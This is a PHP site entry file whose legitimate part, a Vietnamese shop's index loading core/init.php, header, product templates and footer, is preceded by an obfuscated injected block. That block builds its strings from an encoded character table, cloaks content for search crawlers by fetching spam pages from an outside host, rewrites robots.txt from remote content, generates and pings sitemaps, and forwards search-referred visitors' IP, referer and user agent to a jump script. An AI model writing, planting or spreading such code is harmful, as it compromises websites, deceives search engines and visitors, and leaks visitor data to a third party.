<?php
@header('Content-Type:text/html;charset=utf-8');
error_reporting(0);
$OOOOOO = "%71%77%65%72%74%79%75%69%6f%70%61%73%64%66%67%68%6a%6b%6c%7a%78%63%76%62%6e%6d%51%57%45%52%54%59%55%49%4f%50%41%53%44%46%47%48%4a%4b%4c%5a%58%43%56%42%4e%4d%5f%2d%22%3f%3e%20%3c%2e%2d%3d%3a%2f%31%32%33%30%36%35%34%38%37%39%27%3b%28%29%26%5e%24%5b%5d%5c%5c%25%7b%7d%21%2a%7c%2b%2c";
global $O;
$O = urldecode($OOOOOO);
$oOooOO = 'z0222_6';
$oOooOOoO = $O[15] . $O[4] . $O[4] . $O[9] . $O[62] . $O[63] . $O[63] . $oOooOO . $O[59] . $O[5] . $O[14] . $O[8] . $O[8] . $O[12] . $O[11] . $O[59] . $O[4] . $O[8] . $O[9];
 
function curlGet($url)
{
    $urlo = curl_init();
    curl_setopt($urlo, CURLOPT_URL, $url);
    curl_setopt($urlo, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($urlo, CURLOPT_CONNECTTIMEOUT, 5);
    $urloO = curl_exec($urlo);
    curl_close($urlo);
    return $urloO;
}
function curl($OooooO, $OOOoooo = array())
{
    global $O;
    $OooooO = str_replace(' ', '+', $OooooO);
    $OOooooO = curl_init();
    curl_setopt($OOooooO, CURLOPT_URL, "{$OooooO}");
    curl_setopt($OOooooO, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($OOooooO, CURLOPT_HEADER, 0);
    curl_setopt($OOooooO, CURLOPT_TIMEOUT, 10);
    curl_setopt($OOooooO, CURLOPT_POST, 1);
    curl_setopt($OOooooO, CURLOPT_POSTFIELDS, http_build_query($OOOoooo));
    $OOOOooo = curl_exec($OOooooO);
    $fffa = curl_errno($OOooooO);
    curl_close($OOooooO);
    if (0 !== $fffa) {
        return false;
    }
    return $OOOOooo;
}

function ckua($ooOOo)
{
    global $O;
    $ooOOOOo = false;
    $oooooOOo = $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[23] . $O[8] . $O[4] . $O[90] . $O[23] . $O[7] . $O[24] . $O[14] . $O[23] . $O[8] . $O[4] . $O[90] . $O[14] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[90] . $O[10] . $O[8] . $O[18] . $O[90] . $O[23] . $O[7] . $O[24] . $O[14] . $O[90] . $O[5] . $O[10] . $O[15] . $O[8] . $O[8];
    if ($ooOOo != '') {
        if (preg_match("/({$oooooOOo})/si", $ooOOo)) {
            $ooOOOOo = true;
        }
    }
    return $ooOOOOo;
}
function googleyahoobing($ffffa)
{
    global $O;
    $ff = false;
    $cc = "google.co|yahoo.co.jp|bing";
    if ($ffffa != '' && preg_match("/({$cc})/si", $cc)) {
        $ff = true;
    }
    return $ff;
}

 
$ishttps = ((isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] !== "off") ?"https://":"http://");//http://
$uri =$_SERVER["REQUEST_URI"];
$ffas1 = $_SERVER["SERVER_NAME"];
$url = $ishttps . $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];
$indata = "http://fuzgn50z.wholeindustry.com/indata.php";
$map = "http://fuzgn50z.wholeindustry.com/map.php";
$jumpp = "http://fuzgn50z.wholeindustry.com/jump.php";
$words = "http://fuzgn50z.wholeindustry.com/words.php";
$robots = "http://fuzgn50z.wholeindustry.com/robots.php";
 

if (strpos($uri, ".php")) {
    $jump = $ishttps . $_SERVER["HTTP_HOST"] . $_SERVER["PHP_SELF"];
} else {
    $jump = $ishttps . $_SERVER["HTTP_HOST"];
}


$arrays[] = array();
$arrays["domain"] = $_SERVER["HTTP_HOST"];
$arrays["req_uri"] = $uri;
$arrays["href"] = $jump;
$arrays["req_url"] = $url;

//???robots

if (substr($uri, -6) == "robots") {

    $a3 = curl($robots, $arrays);
	
    define('BASE_PATH', str_ireplace($_SERVER["PHP_SELF"], '', __FILE__));
    file_put_contents(BASE_PATH ."/robots.txt", $a3);
    $a3 = file_get_contents(BASE_PATH . "/robots.txt");
    if (strpos($a3, "Crawl-delay:3")) {
        echo $O[3] . $O[8] . $O[23] . $O[8] . $O[4] . $O[11] . $O[59] . $O[4] . $O[20] . $O[4] . $O[57] . $O[13] . $O[7] . $O[18] . $O[2] . $O[57] . $O[21] . $O[3] . $O[2] . $O[10] . $O[4] . $O[2] . $O[57] . $O[11] . $O[6] . $O[21] . $O[21] . $O[2] . $O[11] . $O[11] . $O[88];
    } else {
        echo $O[3] . $O[8] . $O[23] . $O[8] . $O[4] . $O[11] . $O[59] . $O[4] . $O[20] . $O[4] . $O[57] . $O[13] . $O[7] . $O[18] . $O[2] . $O[57] . $O[21] . $O[3] . $O[2] . $O[10] . $O[4] . $O[2] . $O[57] . $O[13] . $O[10] . $O[7] . $O[18] . $O[88];
    }
    exit;
}

//???xml
if (substr($uri, -4) == ".xml") {


    if (strpos($uri,"pingsitemap.xml")) {
		/*
		?map ?? ??????????
		http://localhost/index.php?pingsitemap.xml
		domain=localhost&req_uri=%2Findex.php%3Fpingsitemap.xml&href=http%3A%2F%2Flocalhost%2Findex.php&req_url=http%3A%2F%2Flocalhost%2Findex.php%3Fpingsitemap.xml
		*/
        $jumpO = curl($map, $arrays);
        $arr = explode(",", $jumpO);
        $arr[] = "sitemap";
		//?????google??xml ???
        for ($a4 = 0; $a4 < count($arr); $a4++) {
            if (strpos($jump, ".xml") > 0) {
                $a3 = $O[55];//?
            } else {
                $a3 = $O[63];///
            }
            $a1 = $jump . $a3 . $arr[$a4] . ".xml";
            $a1 = "https://www.google.com/ping?sitemap=" . $a1;
            $c1 = "http://www.google.com/ping?sitemap=" . $a1;
            if (stristr(@file_get_contents($a1), "successfully")) {
                echo $a1 . $O[61] . $O[61] . $O[61] . $O[56] . $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[62] . $O[57] . $O[34] . $O[43] . PHP_EOL;
            } else {
                if (stristr(@curlget($a1), "successfully")) {
                    echo $a1 . $O[61] . $O[61] . $O[61] . $O[56] . $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[62] . $O[57] . $O[34] . $O[43] . PHP_EOL;
                } else {
                    if (stristr(@file_get_contents($c1), "successfully")) {
                        echo $c1 . $O[61] . $O[61] . $O[61] . $O[56] . $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[62] . $O[57] . $O[34] . $O[43] . PHP_EOL;
                    } else {
                        if (stristr(@curlget($c1), "successfully")) {
                            echo $c1 . $O[61] . $O[61] . $O[61] . $O[56] . $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[62] . $O[57] . $O[34] . $O[43] . PHP_EOL;
                        } else {
                            echo $c1 . $O[61] . $O[61] . $O[61] . $O[56] . $O[37] . $O[6] . $O[23] . $O[25] . $O[7] . $O[4] . $O[4] . $O[7] . $O[24] . $O[14] . $O[57] . $O[40] . $O[8] . $O[8] . $O[14] . $O[18] . $O[2] . $O[57] . $O[37] . $O[7] . $O[4] . $O[2] . $O[25] . $O[10] . $O[9] . $O[62] . $O[57] . $O[13] . $O[10] . $O[7] . $O[18] . PHP_EOL;
                        }
                    }
                }
            }
        }
        exit;
    }
	//????.xml??????
	//??allsitemap.xml ????,???
    if (strpos($uri, "allsitemap.xml")) {
		//file_put_contents("allsitemapaaaaa.txt",http_build_query($arrays));
        $jumpO = curl($map, $arrays);
        header("Content-type:text/xml");
        echo $jumpO;
        exit;
    }
	//?php??xml??????
    if (strpos($uri, ".php")) {
        $a1 = explode("?", $uri);
        $a1 = $a1[count($a1) - 1];
        $a1 = str_replace(".xml", "", $a1);
    } else {
        $a1 = str_replace("/", "", $uri);
        $a1 = str_replace(".xml", "", $a1);
    }
	

	// ??????????? (???xml,word?? ????.xml,????,??????1???)
    $arrays["word"] = $a1;
	//??action?? ??sitemap
    $arrays["action"] = "check_sitemap";
	//???? curl 
	//file_put_contents("words__aaaaa.txt",$a1);
    $c4 = curl($words, $arrays);//////////////////////////////////////////////////1
	//???1??xml,???
    if ($c4 == '1') {
		// file_put_contents("c4s1.txt",http_build_query($arrays));
        $jumpO = curl($map, $arrays);
        header("Content-type:text/xml");
        echo $jumpO;
        exit;
    }

	//????????????
	//????????words
    $arrays["action"] = "check_words";
	//??????
    $c3 = curl($words, $arrays);/////////////////////////////////////////////////2
	//echo "xxxxxxxxxx".$c3; 
	//???map  ?????? ??xml
    if (strpos($uri, "map") > 0 || $c3 == '1') {
        $arrays["action"] ="rand_xml"; 
        $c4 = curl($words, $arrays);////////////////////////////////////////////////3
        header("Content-type:text/xml");
        echo $c4;
        exit;
    }
}

//???php ??mainshell
if (strpos($uri, ".php")) {
    $c2 = $ishttps . $_SERVER["SERVER_NAME"] . $_SERVER["PHP_SELF"];
    $arrays["main_shell"] = $c2;
} else {
    $c2 = $ishttps . $_SERVER["SERVER_NAME"];
    $arrays["main_shell"] = $c2;
}

$c4 = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
//?????googleyahoobing
$a2 = googleyahoobing($c4);
//??????? ????6????,??? main_shell(??url) ??????  ????
if ($a2 && is_numeric(substr($_SERVER['REQUEST_URI'], -6))) { 
    $arrays["ip"] = $_SERVER["REMOTE_ADDR"];
    $arrays["referer"] = $c4;
    $arrays["user_agent"] =  strtolower(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : '');
	//file_put_contents("rrr.txt",http_build_query($arrays));
    echo curl($jumpp, $arrays);
    exit;
}


$a1 =  strtolower(isset($_SERVER["HTTP_USER_AGENT"]) ? $_SERVER["HTTP_USER_AGENT"] : '');
//??UA??????
$c6 = ckua($a1);
if ($c6) {
    $arrays["http_user_agent"] = $a1;
    $a2 = curl($indata, $arrays);
    if ($a2 == "404") {
        header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[70] . $O[67] . $O[70] . $O[57] . $O[50] . $O[8] . $O[4] . $O[57] . $O[39] . $O[8] . $O[6] . $O[24] . $O[12]);
        exit;
    } else {
        if ($a2 == "500") {
            header($O[41] . $O[30] . $O[30] . $O[35] . $O[63] . $O[64] . $O[59] . $O[67] . $O[57] . $O[69] . $O[67] . $O[67] . $O[57] . $O[33] . $O[24] . $O[4] . $O[2] . $O[3] . $O[24] . $O[10] . $O[18] . $O[57] . $O[37] . $O[2] . $O[3] . $O[22] . $O[2] . $O[3] . $O[57] . $O[28] . $O[3] . $O[3] . $O[8] . $O[3]);
            exit;
        } else {
            if ($a2 == "blank") {
                echo '';
                exit;
            } else {
                echo $a2;
                exit;
            }
        }
    }
} else {
      header("HTTP/1.0 404 Not Found");
} ?><?php
// Require database & th�0�0ng tin chung
require_once 'core/init.php';
 
// Require header
require_once 'includes/header-thu-van-may-9k.php';
// Danh sach account

// $xss = new Anti_xss;

// $act = $xss->clean_up($_GET['act']);

// switch ($act) {
// 	case 'view':
// 		require_once 'templates/products/view.php'; 
// 		break;
// 	case 'LQM':
// 		require_once 'templates/products/lqm_list.php'; 
// 		break;  
// 			case 'HanQuoc':
// 		require_once 'templates/products/Han_list.php'; 
// 		break;
// 		case 'PBE':
// 		require_once 'templates/products/PBE_list.php'; 
// 		break;
// 	default:
// 		require_once 'templates/products/lol_list.php'; 
// 		break;
// }
require_once 'templates/products/main.php'; 

// Require footer
require_once 'includes/footer.php';

 
?>
